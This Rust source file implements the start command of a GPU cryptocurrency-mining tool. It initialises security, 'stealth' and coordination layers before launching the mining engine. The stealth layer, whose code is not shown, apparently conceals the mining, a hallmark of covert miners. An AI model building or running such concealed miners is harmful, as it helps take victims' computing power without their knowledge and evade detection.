//! # Start Command (Khởi Động Mining)
//!
//! Khởi động mining operations.

use anyhow::Result;
use colored::*;
use indicatif::{ProgressBar, ProgressStyle};
use std::path::Path;
use tracing::{info, warn};

use crate::config_loader;
use mining_core::MiningEngine;
use stealth_layer::StealthManager;
use coordination::CoordinationManager;
use security::SecurityManager;

/// Execute start command
pub async fn execute(config_path: &Path, daemon: bool) -> Result<()> {
    println!("{}", "▶️  Starting Mining Operations...".green().bold());

    // Load configuration
    println!("📄 Loading configuration from: {}", config_path.display());
    let config = config_loader::load_config(config_path)?;

    // Cache values for display (avoid clone issues)
    let pool_url = config.mining.stratum_config.primary_pool.url.clone();
    let gpu_devices = config.mining.gpu_devices.clone();
    let stealth_profile = config.stealth.profile.clone();

    // Create progress bar
    let pb = ProgressBar::new(5);
    pb.set_style(
        ProgressStyle::default_bar()
            .template("{spinner:.green} [{bar:40.cyan/blue}] {pos}/{len} {msg}")
            .unwrap()
            .progress_chars("#>-"),
    );

    // Step 1: Initialize Security
    pb.set_message("Initializing Security Layer...");
    let security_manager = SecurityManager::new(config.security.clone());
    security_manager.apply_hardening()?;
    pb.inc(1);

    // Step 2: Initialize Stealth
    pb.set_message("Initializing Stealth Layer...");
    let stealth_manager = StealthManager::new(config.stealth.clone())?;
    stealth_manager.activate().await?;
    pb.inc(1);

    // Step 3: Initialize Coordination
    pb.set_message("Initializing Coordination Layer...");
    let coordination_manager = CoordinationManager::new(config.coordination.clone());
    coordination_manager.start().await?;
    pb.inc(1);

    println!("\n{}", "🎉 Mining system is now running!".green().bold());
    println!("   Pool: {}", pool_url);
    println!("   GPUs: {:?}", gpu_devices);
    println!("   Stealth Profile: {:?}", stealth_profile);

    // Step 4: Initialize Mining Engine
    pb.set_message("Initializing Mining Engine...");
    let mut mining_engine = MiningEngine::new(config.mining.clone())?;
    pb.inc(1);

    // Step 5: Start Mining
    pb.set_message("Starting Mining Loop...");
    mining_engine.start().await?;
    pb.finish_with_message("Mining started successfully! ✅");

    if daemon {
        info!("Running in daemon mode...");
        // TODO: Daemonize process
        warn!("Daemon mode not yet implemented - running in foreground");
    }

    println!("\n{}", "Press Ctrl+C to stop mining...".yellow());

    // Wait for Ctrl+C
    tokio::signal::ctrl_c().await?;

    println!("\n{}", "⏹️  Stopping mining...".yellow());
    mining_engine.stop().await?;
    stealth_manager.deactivate().await?;
    coordination_manager.stop().await?;

    println!("{}", "✅ Mining stopped successfully!".green());

    Ok(())
}